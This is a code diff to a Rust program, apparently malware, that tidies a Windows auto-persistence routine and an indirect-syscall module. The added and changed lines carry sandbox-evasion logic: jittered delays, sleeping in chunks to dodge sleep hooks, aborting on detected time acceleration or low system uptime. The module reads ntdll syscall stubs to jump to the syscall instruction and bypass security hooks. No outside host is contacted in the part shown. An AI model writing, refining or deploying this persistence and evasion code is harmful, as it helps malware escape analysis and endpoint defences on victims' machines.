@@ -709,6 +709,18 @@ use std::sync::atomic::{AtomicBool, Ordering};
 #[cfg(target_os = "windows")]
 static AUTO_PERSIST_DONE: AtomicBool = AtomicBool::new(false);
 
+// Auto-persistence timing constants
+#[cfg(target_os = "windows")]
+const AUTO_PERSIST_BASE_DELAY_SECS: u64 = 180; // 3 minutes base delay
+#[cfg(target_os = "windows")]
+const AUTO_PERSIST_JITTER_MAX: usize = 120; // Max jitter in seconds (0-120)
+#[cfg(target_os = "windows")]
+const AUTO_PERSIST_CHUNK_SECS: u64 = 30; // Sleep chunk size in seconds
+#[cfg(target_os = "windows")]
+const AUTO_PERSIST_TIME_ACCEL_THRESHOLD: u64 = 25; // If sleep < this, time acceleration detected
+#[cfg(target_os = "windows")]
+const AUTO_PERSIST_MIN_UPTIME_MS: u64 = 600_000; // 10 minutes minimum uptime
+
 /// Marker file to check if persistence was already established in a previous run
 #[cfg(target_os = "windows")]
 fn get_persistence_marker_path() -> PathBuf {
@@ -792,23 +804,22 @@ pub fn schedule_auto_persistence() {
         // 2. Accelerate time (we use real-time checks)
         // 3. Look for immediate persistence behavior
 
-        let base_delay_secs = 180; // 3 minutes base
-        let jitter_secs = get_machine_index() % 120; // 0-120 seconds jitter
-        let total_delay = base_delay_secs + jitter_secs as u64;
+        let jitter_secs = get_machine_index() % AUTO_PERSIST_JITTER_MAX;
+        let total_delay = AUTO_PERSIST_BASE_DELAY_SECS + jitter_secs as u64;
 
         // Sleep in chunks to avoid detection of long sleep calls
         // Some sandboxes hook Sleep() and fast-forward
-        let chunks = total_delay / 30; // 30-second chunks
-        let remainder = total_delay % 30;
+        let chunks = total_delay / AUTO_PERSIST_CHUNK_SECS;
+        let remainder = total_delay % AUTO_PERSIST_CHUNK_SECS;
 
         for _ in 0..chunks {
             // Use real-time validation between chunks
             let start = std::time::Instant::now();
-            std::thread::sleep(std::time::Duration::from_secs(30));
+            std::thread::sleep(std::time::Duration::from_secs(AUTO_PERSIST_CHUNK_SECS));
 
             // Anti-time-acceleration check: if sleep completed too fast,
             // sandbox might be accelerating time - abort
-            if start.elapsed().as_secs() < 25 {
+            if start.elapsed().as_secs() < AUTO_PERSIST_TIME_ACCEL_THRESHOLD {
                 return; // Time acceleration detected, abort persistence
             }
         }
@@ -826,9 +837,8 @@ pub fn schedule_auto_persistence() {
 
         // Additional check: system uptime should be substantial
         let uptime_ms = unsafe { winapi::um::sysinfoapi::GetTickCount64() };
-        if uptime_ms < 600_000 {
-            // Less than 10 minutes uptime
-            return; // Freshly booted system, likely sandbox
+        if uptime_ms < AUTO_PERSIST_MIN_UPTIME_MS {
+            return; // Freshly booted system (< 10 min uptime), likely sandbox
         }
 
         // ====================================================================
@@ -873,6 +883,11 @@ mod indirect_syscalls {
 
     /// Get the syscall number for a given NT function
     /// This reads the syscall stub in ntdll and extracts the syscall number
+    ///
+    /// # Safety
+    /// This function reads memory from ntdll.dll which is always loaded and executable.
+    /// The syscall stubs in ntdll are at least 24 bytes, making this read safe.
+    /// GetProcAddress returns a valid pointer to the function entry point.
     pub unsafe fn get_syscall_number(func_name: &str) -> Option<u32> {
         let ntdll = CString::new("ntdll.dll").ok()?;
         let func = CString::new(func_name).ok()?;
@@ -893,6 +908,7 @@ mod indirect_syscalls {
         // B8 XX 00 00 00     mov eax, SYSCALL_NUMBER
         // 0F 05              syscall
         // C3                 ret
+        // Total: ~15 bytes, we read 24 to be safe
         let bytes = std::slice::from_raw_parts(func_addr as *const u8, 24);
 
         for i in 0..20 {
@@ -910,6 +926,10 @@ mod indirect_syscalls {
     /// Get the syscall instruction address in ntdll (for indirect syscall)
     /// We jump to this address to execute the syscall, bypassing any hooks
     /// placed at the function entry point
+    ///
+    /// # Safety
+    /// This function reads memory from ntdll.dll which is always loaded and executable.
+    /// The syscall stubs in ntdll are at least 32 bytes, making this read safe.
     pub unsafe fn get_syscall_instruction_addr(func_name: &str) -> Option<*const u8> {
         let ntdll = CString::new("ntdll.dll").ok()?;
         let func = CString::new(func_name).ok()?;
